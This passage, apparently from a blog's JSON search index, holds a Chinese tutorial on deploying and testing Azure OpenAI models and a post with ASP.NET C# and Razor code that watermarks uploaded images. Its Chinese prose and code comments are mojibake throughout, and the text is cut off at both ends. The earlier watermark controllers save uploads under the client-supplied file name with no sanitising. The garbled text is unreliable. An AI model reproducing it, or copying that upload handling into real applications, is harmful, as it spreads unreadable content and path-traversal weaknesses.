çš„â€œéƒ¨ç½²â€é¡µä¸­ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æ‰€æœ‰éƒ¨ç½²çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬éƒ¨ç½²åç§°ã€æ¨¡å‹åç§°ã€æ¨¡å‹ç‰ˆæœ¬ã€çŠ¶æ€ã€åˆ›å»ºæ—¥æœŸç­‰ã€‚ ä½¿ç”¨ Azure CLI è¿›è¡Œéƒ¨ç½²è¿˜å¯ä»¥ä½¿ç”¨æ§åˆ¶å°éƒ¨ç½²æ¨¡å‹ã€‚ ä½¿ç”¨æ­¤ç¤ºä¾‹ï¼Œå°†ä»¥ä¸‹å˜é‡æ›¿æ¢ä¸ºè‡ªå·±çš„èµ„æºå€¼ï¼š OAIResourceGroupï¼šæ›¿æ¢ä¸ºèµ„æºç»„åç§° MyOpenAIResourceï¼šæ›¿æ¢ä¸ºèµ„æºåç§° MyModelï¼šæ›¿æ¢ä¸ºæ¨¡å‹çš„å”¯ä¸€åç§° gpt-35-turboï¼šæ›¿æ¢ä¸ºè¦éƒ¨ç½²çš„åŸºç¡€æ¨¡å‹ 123456789az cognitiveservices account deployment create \\ -g OAIResourceGroup \\ -n MyOpenAIResource \\ --deployment-name MyModel \\ --model-name gpt-35-turbo \\ --model-version &quot;0301&quot; \\ --model-format OpenAI \\ --sku-name &quot;Standard&quot; \\ --sku-capacity 1 ä½¿ç”¨ REST API è¿›è¡Œéƒ¨ç½²å¯ä»¥ä½¿ç”¨ REST API éƒ¨ç½²æ¨¡å‹ã€‚ åœ¨è¯·æ±‚æ­£æ–‡ä¸­ï¼ŒæŒ‡å®šè¦éƒ¨ç½²çš„åŸºç¡€æ¨¡å‹ã€‚ è¯·å‚é˜… Azure OpenAI æ–‡æ¡£ä¸­çš„ç¤ºä¾‹ã€‚ ä½¿ç”¨æç¤ºä»æ¨¡å‹å®Œæˆéƒ¨ç½²æ¨¡å‹åï¼Œå¯ä»¥æµ‹è¯•å…¶å®Œæˆæç¤ºçš„æ–¹å¼ã€‚ æç¤ºæ˜¯å‘é€åˆ°éƒ¨ç½²æ¨¡å‹çš„å®Œæˆç»ˆç»“ç‚¹çš„è¯·æ±‚çš„æ–‡æœ¬éƒ¨åˆ†ã€‚ å“åº”è¢«ç§°ä¸ºå®Œæˆï¼Œå¯ä»¥é‡‡ç”¨æ–‡æœ¬ã€ä»£ç çš„å½¢å¼æˆ–å…¶ä»–å½¢å¼ã€‚ æç¤ºç±»å‹å¯ä»¥æ ¹æ®ä»»åŠ¡å°†æç¤ºåˆ†ç»„ä¸ºè¯·æ±‚ç±»å‹ã€‚ ä»»åŠ¡ç±»å‹ æç¤ºç¤ºä¾‹ å®Œæˆç¤ºä¾‹ å¯¹å†…å®¹è¿›è¡Œåˆ†ç±» Tweetï¼šæˆ‘å–œæ¬¢è¿™æ¬¡æ—…è¡Œã€‚ æƒ…ç»ª: æ­£ ç”Ÿæˆæ–°å†…å®¹ åˆ—å‡ºæ—…è¡Œæ–¹å¼ 1.éª‘è¡Œ 2. ä¹˜è½¦ â€¦ è¿›è¡Œå¯¹è¯ å‹å¥½çš„ AI åŠ©æ‰‹ è¯·å‚è§ç¤ºä¾‹ è½¬æ¢ï¼ˆè½¬æ¢å’Œç¬¦å·è½¬æ¢ï¼‰ è‹±è¯­ï¼šä½ å¥½ æ³•è¯­ï¼š bonjour æ±‡æ€»å†…å®¹ æä¾›å†…å®¹æ€»ç»“ {text} æœºå™¨å­¦ä¹ çš„å†…å®¹å…±äº«æ–¹æ³•ã€‚ ä»ç¦»å¼€çš„ä½ç½®ç»§ç»­ ç§æ¤è¥¿çº¢æŸ¿çš„ä¸€ç§æ–¹æ³• å°±æ˜¯æ’­ç§ç§å­ã€‚ æä¾›äº‹å®ç­”å¤ åœ°çƒæ‹¥æœ‰å¤šå°‘é¢—å«æ˜Ÿï¼Ÿ ä¸€ç§ å®Œæˆè´¨é‡æœ‰å‡ ä¸ªå› ç´ ä¼šå½±å“ä»ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆä¸­è·å¾—çš„å®Œæˆè´¨é‡ã€‚ æç¤ºçš„å·¥ç¨‹å¤„ç†æ–¹å¼ã€‚ å•å‡»æ­¤å¤„è¯¦ç»†äº†è§£æç¤ºå·¥ç¨‹ã€‚ æ¨¡å‹å‚æ•°ï¼ˆä¸‹æ–‡å°†ä»‹ç»ï¼‰ è®­ç»ƒæ¨¡å‹çš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰æ¨¡å‹å¾®è°ƒè¿›è¡Œè°ƒæ•´ ä¸é€šè¿‡æç¤ºå·¥ç¨‹å’Œå‚æ•°è°ƒæ•´ç›¸æ¯”ï¼Œä½ å¯ä»¥é€šè¿‡è®­ç»ƒè‡ªå®šä¹‰æ¨¡å‹æ›´å¥½åœ°æ§åˆ¶è¿”å›çš„å®Œæˆã€‚ å‘èµ·å‘¼å«å¯ä»¥é€šè¿‡ REST APIã€Pythonã€C# æˆ–ä» Studio å¼€å§‹è°ƒç”¨éƒ¨ç½²çš„æ¨¡å‹ã€‚ å¦‚æœéƒ¨ç½²çš„æ¨¡å‹å…·æœ‰ GPT-3.5 æˆ– GPT-4 æ¨¡å‹åº“ï¼Œè¯·ä½¿ç”¨èŠå¤©å®Œæˆæ–‡æ¡£ï¼Œè¯¥æ–‡æ¡£å…·æœ‰ä¸å…¶ä»–åŸºç¡€æ¨¡å‹ä¸åŒçš„è¯·æ±‚ç»ˆç»“ç‚¹å’Œå˜é‡ã€‚ åœ¨ Azure OpenAI Studio çš„æ“åœºä¸­æµ‹è¯•æ¨¡å‹æ“åœºæ˜¯ Azure OpenAI Studio ä¸­çš„æœ‰ç”¨æ¥å£ï¼Œå¯ç”¨äºè¯•éªŒéƒ¨ç½²çš„æ¨¡å‹ï¼Œè€Œæ— éœ€å¼€å‘è‡ªå·±çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºã€‚ Azure OpenAI Studio æä¾›äº†å…·æœ‰ä¸åŒå‚æ•°ä¼˜åŒ–é€‰é¡¹çš„å¤šä¸ªæ“åœºã€‚ å®Œæˆæ“åœºå®Œæˆæ“åœºå…è®¸ä½ é€šè¿‡æ–‡æœ¬è¾“å…¥æ–‡æœ¬è¾“å‡ºæ¥å£è°ƒç”¨éƒ¨ç½²çš„æ¨¡å‹ï¼Œå¹¶è°ƒæ•´å‚æ•°ã€‚ ä½ éœ€è¦åœ¨â€œéƒ¨ç½²â€ä¸‹é€‰æ‹©æ¨¡å‹çš„éƒ¨ç½²åç§°ã€‚ ï¼ˆå¯é€‰ï¼‰å¯ä»¥ä½¿ç”¨æä¾›çš„ç¤ºä¾‹å…¥é—¨ï¼Œç„¶åè¾“å…¥è‡ªå·±çš„æç¤ºã€‚ å®Œæˆæ“åœºå‚æ•°å¯ä»¥è°ƒæ•´è®¸å¤šå‚æ•°æ¥æ›´æ”¹æ¨¡å‹çš„æ€§èƒ½ï¼š æ¸©åº¦ï¼šæ§åˆ¶éšæœºæ€§ã€‚ é™ä½æ¸©åº¦æ„å‘³ç€æ¨¡å‹ä¼šäº§ç”Ÿæ›´å¤šé‡å¤æ€§å’Œç¡®å®šæ€§çš„å›å¤ã€‚ æé«˜æ¸©åº¦ä¼šå¯¼è‡´æ›´å¤šæ„å¤–æˆ–åˆ›é€ æ€§çš„å›å¤ã€‚ è¯·å°è¯•è°ƒæ•´æ¸©åº¦æˆ– Top P å€¼ï¼Œä½†ä¸è¦åŒæ—¶è°ƒæ•´ä¸¤è€…ã€‚ æœ€å¤§é•¿åº¦(æ ‡è®°æ•°)ï¼šå¯¹æ¯ä¸ªæ¨¡å‹å“åº”çš„æ ‡è®°æ•°è®¾ç½®é™åˆ¶ã€‚ è¯¥ API æ”¯æŒæœ€å¤š 4000 ä¸ªæ ‡è®°ï¼ŒåŒ…æ‹¬æç¤ºï¼ˆåŒ…æ‹¬ç³»ç»Ÿæ¶ˆæ¯ã€ç¤ºä¾‹ã€æ¶ˆæ¯å†å²è®°å½•ä»¥åŠç”¨æˆ·æŸ¥è¯¢ï¼‰å’Œæ¨¡å‹çš„å“åº”ã€‚ å¯¹äºå…¸å‹çš„è‹±æ–‡æ–‡æœ¬ï¼Œä¸€ä¸ªæ ‡è®°å¤§çº¦æ˜¯å››ä¸ªå­—ç¬¦ã€‚ åœæ­¢åºåˆ—ï¼šä½¿å“åº”åœæ­¢åœ¨æ‰€éœ€ç‚¹ï¼Œä¾‹å¦‚å¥å­æˆ–åˆ—è¡¨çš„æœ«å°¾ã€‚ æŒ‡å®šæœ€å¤šå››ä¸ªåºåˆ—ï¼Œæ¨¡å‹å°†åœæ­¢åœ¨å“åº”ä¸­ç”Ÿæˆæ›´å¤šæ ‡è®°ã€‚ è¿”å›çš„æ–‡æœ¬ä¸åŒ…å«åœæ­¢åºåˆ—ã€‚ æœ€é«˜æ¦‚ç‡(æœ€é«˜ P)ï¼šä¸æ¸©åº¦ç±»ä¼¼ï¼Œå®ƒæ§åˆ¶ç€éšæœºæ€§ï¼Œä½†ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ã€‚ é™ä½ Top P å€¼ä¼šå°†æ¨¡å‹çš„æ ‡è®°é€‰æ‹©èŒƒå›´ç¼©å°åˆ°å¯èƒ½æ€§æ›´é«˜çš„æ ‡è®°ã€‚ å¢åŠ  Top P å€¼ä¼šä½¿æ¨¡å‹æ—¢é€‰æ‹©å¯èƒ½é«˜çš„æ ‡è®°åˆé€‰æ‹©å¯èƒ½æ€§ä½çš„æ ‡è®°ã€‚ è¯·å°è¯•è°ƒæ•´æ¸©åº¦æˆ– Top P å€¼ï¼Œä½†ä¸è¦åŒæ—¶è°ƒæ•´ä¸¤è€…ã€‚ é¢‘ç‡å¤„ç½šï¼šæ ¹æ®æ ‡è®°åœ¨æ–‡æœ¬ä¸­å‡ºç°çš„é¢‘ç‡ï¼ŒæŒ‰æ¯”ä¾‹é™ä½æ ‡è®°é‡å¤çš„å¯èƒ½æ€§ã€‚ è¿™ä¼šé™ä½åœ¨å“åº”ä¸­é‡å¤å®Œå…¨ç›¸åŒæ–‡æœ¬çš„å¯èƒ½æ€§ã€‚ å­˜åœ¨å¤„ç½šï¼šé™ä½åˆ°ç›®å‰ä¸ºæ­¢åœ¨æ–‡æœ¬ä¸­å‡ºç°çš„ä»»ä½•æ ‡è®°é‡å¤çš„å¯èƒ½æ€§ã€‚ è¿™ä¼šå¢åŠ åœ¨å“åº”ä¸­å¼•å…¥æ–°ä¸»é¢˜çš„å¯èƒ½æ€§ã€‚ å“åº”å‰æ–‡æœ¬ï¼šåœ¨ç”¨æˆ·è¾“å…¥ä¹‹åå’Œæ¨¡å‹å“åº”ä¹‹å‰æ’å…¥æ–‡æœ¬ã€‚ è¿™æœ‰åŠ©äºä¸ºå“åº”å‡†å¤‡æ¨¡å‹ã€‚ å“åº”åæ–‡æœ¬ï¼šåœ¨æ¨¡å‹ç”Ÿæˆçš„å“åº”ä¹‹åæ’å…¥æ–‡æœ¬ä»¥é¼“åŠ±è¿›ä¸€æ­¥çš„ç”¨æˆ·è¾“å…¥ï¼Œå°±åƒå¯¹è¯å»ºæ¨¡ä¸€æ ·ã€‚ èŠå¤©æ“åœºèŠå¤©æ“åœºåŸºäºå¯¹è¯ä¼ å…¥æ¶ˆæ¯ä¼ å‡ºç•Œé¢ã€‚ å¯ä»¥ä½¿ç”¨ç³»ç»Ÿæ¶ˆæ¯åˆå§‹åŒ–ä¼šè¯ä»¥è®¾ç½®èŠå¤©ä¸Šä¸‹æ–‡ã€‚ åœ¨èŠå¤©æ“åœºä¸­ï¼Œå¯ä»¥æ·»åŠ å°‘æ ·æœ¬ç¤ºä¾‹ã€‚ â€œå°‘æ ·æœ¬â€ä¸€è¯æ˜¯æŒ‡æä¾›å‡ ä¸ªç¤ºä¾‹æ¥å¸®åŠ©æ¨¡å‹äº†è§£å®ƒéœ€è¦æ‰§è¡Œçš„æ“ä½œã€‚ å¯ä»¥å°†å…¶ä¸é›¶æ ·æœ¬ï¼ˆæŒ‡ä¸æä¾›ä»»ä½•ç¤ºä¾‹ï¼‰è¿›è¡Œå¯¹æ¯”ã€‚ åœ¨åŠ©æ‰‹è®¾ç½®ä¸­ï¼Œå¯ä»¥æä¾›ç”¨æˆ·è¾“å…¥å’ŒåŠ©æ‰‹å“åº”çš„å°‘æ ·æœ¬ç¤ºä¾‹ã€‚ åŠ©æ‰‹ä¼šå°è¯•ä»¥ä½ åœ¨ç³»ç»Ÿæ¶ˆæ¯ä¸­å®šä¹‰çš„è¯­æ°”ã€è§„åˆ™å’Œæ ¼å¼æ¥æ¨¡æ‹Ÿè¿™é‡ŒåŒ…å«çš„å“åº”ã€‚ èŠå¤©æ“åœºå‚æ•°â€œå®Œæˆâ€æ“åœºç­‰â€œèŠå¤©â€æ“åœºè¿˜åŒ…æ‹¬æ¸©åº¦å‚æ•°ã€‚ â€œèŠå¤©â€æ“åœºè¿˜æ”¯æŒâ€œå®Œæˆâ€æ“åœºä¸­ä¸å¯ç”¨çš„å…¶ä»–å‚æ•°ã€‚ å…¶ä¸­åŒ…æ‹¬ï¼š æœ€å¤§å“åº”ï¼šå¯¹æ¯ä¸ªæ¨¡å‹å“åº”çš„æ ‡è®°æ•°è®¾ç½®é™åˆ¶ã€‚ è¯¥ API æ”¯æŒæœ€å¤š 4000 ä¸ªæ ‡è®°ï¼ŒåŒ…æ‹¬æç¤ºï¼ˆåŒ…æ‹¬ç³»ç»Ÿæ¶ˆæ¯ã€ç¤ºä¾‹ã€æ¶ˆæ¯å†å²è®°å½•ä»¥åŠç”¨æˆ·æŸ¥è¯¢ï¼‰å’Œæ¨¡å‹çš„å“åº”ã€‚ å¯¹äºå…¸å‹çš„è‹±æ–‡æ–‡æœ¬ï¼Œä¸€ä¸ªæ ‡è®°å¤§çº¦æ˜¯å››ä¸ªå­—ç¬¦ã€‚ æœ€é«˜ Pï¼šä¸æ¸©åº¦ç±»ä¼¼ï¼Œå®ƒæ§åˆ¶ç€éšæœºæ€§ï¼Œä½†ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ã€‚ é™ä½ Top P å€¼ä¼šå°†æ¨¡å‹çš„æ ‡è®°é€‰æ‹©èŒƒå›´ç¼©å°åˆ°å¯èƒ½æ€§æ›´é«˜çš„æ ‡è®°ã€‚ å¢åŠ  Top P å€¼ä¼šä½¿æ¨¡å‹æ—¢é€‰æ‹©å¯èƒ½é«˜çš„æ ‡è®°åˆé€‰æ‹©å¯èƒ½æ€§ä½çš„æ ‡è®°ã€‚ è¯·å°è¯•è°ƒæ•´æ¸©åº¦æˆ– Top P å€¼ï¼Œä½†ä¸è¦åŒæ—¶è°ƒæ•´ä¸¤è€…ã€‚ åŒ…å«çš„è¿‡å»æ¶ˆæ¯æ•°ï¼šé€‰æ‹©è¦åŒ…å«åœ¨æ¯ä¸ªæ–° API è¯·æ±‚ä¸­çš„è¿‡å»æ¶ˆæ¯æ•°ã€‚ åŒ…å«è¿‡å»çš„æ¶ˆæ¯æœ‰åŠ©äºä¸ºæ–°ç”¨æˆ·æŸ¥è¯¢æä¾›æ¨¡å‹ä¸Šä¸‹æ–‡ã€‚ å°†æ­¤æ•°å­—è®¾ç½®ä¸º 10 å°†åŒ…å« 5 ä¸ªç”¨æˆ·æŸ¥è¯¢å’Œ 5 ä¸ªç³»ç»Ÿå“åº”ã€‚ å¯ä»¥åœ¨èŠå¤©æ“åœºä¸­æŸ¥çœ‹â€œå½“å‰æ ‡è®°è®¡æ•°â€ã€‚ ç”±äº API è°ƒç”¨æŒ‰æ ‡è®°å®šä»·ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®æœ€å¤§å“åº”æ ‡è®°é™åˆ¶ï¼Œå› æ­¤éœ€è¦ç•™æ„å½“å‰æ ‡è®°è®¡æ•°ï¼Œä»¥ç¡®ä¿å¯¹è¯ä¸ä¼šè¶…è¿‡æœ€å¤§å“åº”æ ‡è®°è®¡æ•°ã€‚ ç»ƒä¹  - å¼€å§‹ä½¿ç”¨ Azure OpenAI æœåŠ¡å·²å®Œæˆ ç°åœ¨ï¼Œä½ æœ‰æœºä¼šåœ¨ Azure OpenAI Studio ä¸­éƒ¨ç½²å’Œç®¡ç†æ¨¡å‹ã€‚ åœ¨æœ¬ç»ƒä¹ ä¸­ï¼Œä½ å°†éƒ¨ç½² Azure OpenAI åŸºç¡€æ¨¡å‹ï¼Œå¹¶åœ¨å®Œæˆå’ŒèŠå¤©æ“åœºä¸­æµ‹è¯•å®ƒä»¬ã€‚ ä½ å°†æœ‰æœºä¼šäº†è§£æç¤ºå’Œå‚æ•°å¯¹æ–‡æœ¬å’Œä»£ç å®Œæˆçš„å½±å“ã€‚ æ³¨æ„ ä¸ºäº†å®Œæˆæ­¤å®éªŒå®¤ï¼Œä½ å°†éœ€è¦ä¸€ä¸ª Azure è®¢é˜…ã€‚ è¿˜éœ€è¦æ³¨å†Œ Azure OpenAI è®¿é—®æƒé™æ‰èƒ½å®Œæˆæ­¤å®éªŒå®¤ã€‚ è¦å®Œæˆæœ¬æ¨¡å—çš„ç»ƒä¹ ï¼Œè¯·å¯åŠ¨ VM å¹¶æŒ‰ç…§è¯´æ˜æ“ä½œã€‚ æ³¨æ„ è‹¥è¦å®Œæˆæ­¤ç»ƒä¹ ï¼Œä½ å°†éœ€è¦ Microsoft Azure è®¢é˜…ã€‚ å¦‚æœä½ è¿˜æ²¡æœ‰è¯¥è®¢é˜…ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ªã€‚ å¦‚æœéœ€è¦ä¸ºæ­¤ç»ƒä¹ è®¾ç½®è®¡ç®—æœºï¼Œå¯ä»¥ä½¿ç”¨æ­¤è®¾ç½®æŒ‡å—ï¼Œç„¶åæŒ‰ç…§ä¸‹é¢é“¾æ¥çš„ç»ƒä¹ è¯´æ˜è¿›è¡Œæ“ä½œã€‚ è¯·æ³¨æ„ï¼Œè®¾ç½®æŒ‡å—é€‚ç”¨äºå¤šä¸ªå¼€å‘ç»ƒä¹ ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬è¯¥ç‰¹å®šç»ƒä¹ ä¸éœ€è¦çš„è½¯ä»¶ã€‚ æ­¤å¤–ï¼Œç”±äºå¯èƒ½çš„æ“ä½œç³»ç»Ÿå’Œè®¾ç½®é…ç½®çš„èŒƒå›´å¤ªå¹¿ï¼Œå¦‚æœä½ é€‰æ‹©åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šå®Œæˆæ­¤ç»ƒä¹ ï¼Œæˆ‘ä»¬å°†æ— æ³•æä¾›æ”¯æŒã€‚ è¦åœ¨è‡ªå·±çš„è®¡ç®—æœºä¸ŠæŒ‰ç…§è¿™äº›è¯´æ˜è¿›è¡Œæ“ä½œï¼Œå¯ä»¥æŒ‰ç…§æ­¤å¤„çš„ç»ƒä¹ è¯´æ˜è¿›è¡Œæ“ä½œã€‚ æç¤º å®Œæˆç»ƒä¹ åï¼Œå¦‚æœä½ å·²å®Œæˆå¯¹ Azure AI æœåŠ¡çš„å­¦ä¹ ï¼Œè¯·åˆ é™¤åœ¨ç»ƒä¹ æœŸé—´åˆ›å»ºçš„ Azure èµ„æºã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":".NET AddWatermark","slug":"NET-AddWatermark","date":"2024-06-01T11:18:12.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/NET-AddWatermark/","permalink":"https://banjinmei.github.io/2024/06/01/NET-AddWatermark/","excerpt":"","text":"controller1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[HttpPost] public async Task&lt;IActionResult&gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // å°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨ var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // æ·»åŠ æ°´å° using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // è®¾ç½®æ°´å°æ–‡æœ¬çš„å­—ä½“å’Œé¢œè‰² Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // è®¡ç®—æ°´å°ä½ç½® int x = 10; int y = image.Height - 30; // ç»˜åˆ¶æ°´å° g.DrawString(watermarkText, font, brush, new PointF(x, y)); // ä¿å­˜å¸¦æ°´å°çš„å›¾ç‰‡ var newFileName = &quot;watermarked_&quot; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // è¿”å›å¸¦æ°´å°çš„å›¾ç‰‡è·¯å¾„ ViewBag.ImagePath = &quot;/uploads/&quot; + newFileName; &#125; &#125; return View(&quot;Index&quot;); &#125; views123456789101112131415161718192021222324252627282930313233@&#123; ViewBag.Title = &quot;Home Page&quot;;&#125;&lt;h2&gt;å›¾ç‰‡åŠ æ°´å°&lt;/h2&gt;&lt;form action=&quot;/Home/AddWatermark&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;é€‰æ‹©å›¾ç‰‡ï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;watermarkText&quot;&gt;æ°´å°æ–‡å­—ï¼š&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;watermarkText&quot; id=&quot;watermarkText&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;color&quot;&gt;æ°´å°é¢œè‰²ï¼š&lt;/label&gt; &lt;input type=&quot;color&quot; name=&quot;color&quot; id=&quot;color&quot; value=&quot;#000000&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;transparency&quot;&gt;é€æ˜åº¦ï¼š&lt;/label&gt; &lt;input type=&quot;range&quot; name=&quot;transparency&quot; id=&quot;transparency&quot; min=&quot;0&quot; max=&quot;255&quot; value=&quot;128&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot;&gt;ä¸Šä¼ å¹¶æ·»åŠ æ°´å°&lt;/button&gt;&lt;/form&gt;@if (ViewBag.ImagePath != null)&#123; &lt;h3&gt;å¸¦æ°´å°çš„å›¾ç‰‡ï¼š&lt;/h3&gt; &lt;img src=&quot;@ViewBag.ImagePath&quot; alt=&quot;Watermarked Image&quot; &gt;&#125; Uploads folderUploads Position TranslateTransform123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081[HttpPost] public async Task&lt;IActionResult&gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency, string position, int angle) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // å°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨ var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // æ·»åŠ æ°´å° using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // è®¾ç½®æ°´å°æ–‡æœ¬çš„å­—ä½“å’Œé¢œè‰² Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // è®¡ç®—æ°´å°ä½ç½® PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // æ—‹è½¬æ°´å° g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // ä¿å­˜å¸¦æ°´å°çš„å›¾ç‰‡ var newFileName = &quot;watermarked_&quot; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // è¿”å›å¸¦æ°´å°çš„å›¾ç‰‡è·¯å¾„ ViewBag.ImagePath = &quot;/uploads/&quot; + newFileName; &#125; &#125; return View(&quot;Index&quot;); &#125; private PointF CalculateWatermarkPosition(string position, Image image, Graphics g, string text, Font font) &#123; SizeF textSize = g.MeasureString(text, font); float x = 0; float y = 0; switch (position.ToLower()) &#123; case &quot;topleft&quot;: x = 10; y = 10; break; case &quot;topright&quot;: x = image.Width - textSize.Width - 10; y = 10; break; case &quot;center&quot;: x = (image.Width - textSize.Width) / 2; y = (image.Height - textSize.Height) / 2; break; case &quot;bottomleft&quot;: x = 10; y = image.Height - textSize.Height - 10; break; case &quot;bottomright&quot;: x = image.Width - textSize.Width - 10; y = image.Height - textSize.Height - 10; break; &#125; return new PointF(x, y); &#125; change view123456789101112131415&lt;div&gt; &lt;label for=&quot;position&quot;&gt;æ°´å°ä½ç½®ï¼š&lt;/label&gt; &lt;select name=&quot;position&quot; id=&quot;position&quot;&gt; &lt;option value=&quot;topleft&quot;&gt;å·¦ä¸Š&lt;/option&gt; &lt;option value=&quot;topright&quot;&gt;å³ä¸Š&lt;/option&gt; &lt;option value=&quot;center&quot;&gt;å±…ä¸­&lt;/option&gt; &lt;option value=&quot;bottomleft&quot;&gt;å·¦ä¸‹&lt;/option&gt; &lt;option value=&quot;bottomright&quot;&gt;å³ä¸‹&lt;/option&gt; &lt;/select&gt;&lt;/div&gt;&lt;div&gt; &lt;label for=&quot;angle&quot;&gt;å€¾æ–œè§’åº¦ï¼š&lt;/label&gt; &lt;input type=&quot;number&quot; name=&quot;angle&quot; id=&quot;angle&quot; value=&quot;0&quot; /&gt;&lt;/div&gt; multiple 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859[HttpPost]public async Task&lt;IActionResult&gt; AddWatermarkMore(List&lt;IFormFile&gt; files, string watermarkText, string color, int transparency, string position, int angle)&#123; var watermarkedPaths = new List&lt;string&gt;(); foreach (var file in files) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // å°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨ var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; // ç”ŸæˆåŸºäºæ—¶é—´æˆ³å’Œéšæœºæ•°çš„æ–‡ä»¶å var fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmss&#125;_&#123;Guid.NewGuid().ToString().Substring(0, 8)&#125;&#123;Path.GetExtension(file.FileName)&#125;&quot;; var filePath = Path.Combine(uploads, fileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // æ·»åŠ æ°´å° using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // è®¾ç½®æ°´å°æ–‡æœ¬çš„å­—ä½“å’Œé¢œè‰² Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // è®¡ç®—æ°´å°ä½ç½® PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // æ—‹è½¬æ°´å° g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // ä¿å­˜å¸¦æ°´å°çš„å›¾ç‰‡ var newFileName = $&quot;watermarked_&#123;fileName&#125;&quot;; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // æ·»åŠ æ°´å°è·¯å¾„åˆ°åˆ—è¡¨ watermarkedPaths.Add(&quot;/uploads/&quot; + newFileName); &#125; &#125; &#125; ViewBag.ImagePaths = watermarkedPaths; return View(&quot;Index&quot;);&#125; change view123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;h2&gt;å›¾ç‰‡åŠ æ°´å°&lt;/h2&gt;&lt;form action=&quot;/Home/AddWatermark&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;files&quot;&gt;é€‰æ‹©å›¾ç‰‡ï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;files&quot; id=&quot;files&quot; multiple /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;watermarkText&quot;&gt;æ°´å°æ–‡å­—ï¼š&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;watermarkText&quot; id=&quot;watermarkText&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;color&quot;&gt;æ°´å°é¢œè‰²ï¼š&lt;/label&gt; &lt;input type=&quot;color&quot; name=&quot;color&quot; id=&quot;color&quot; 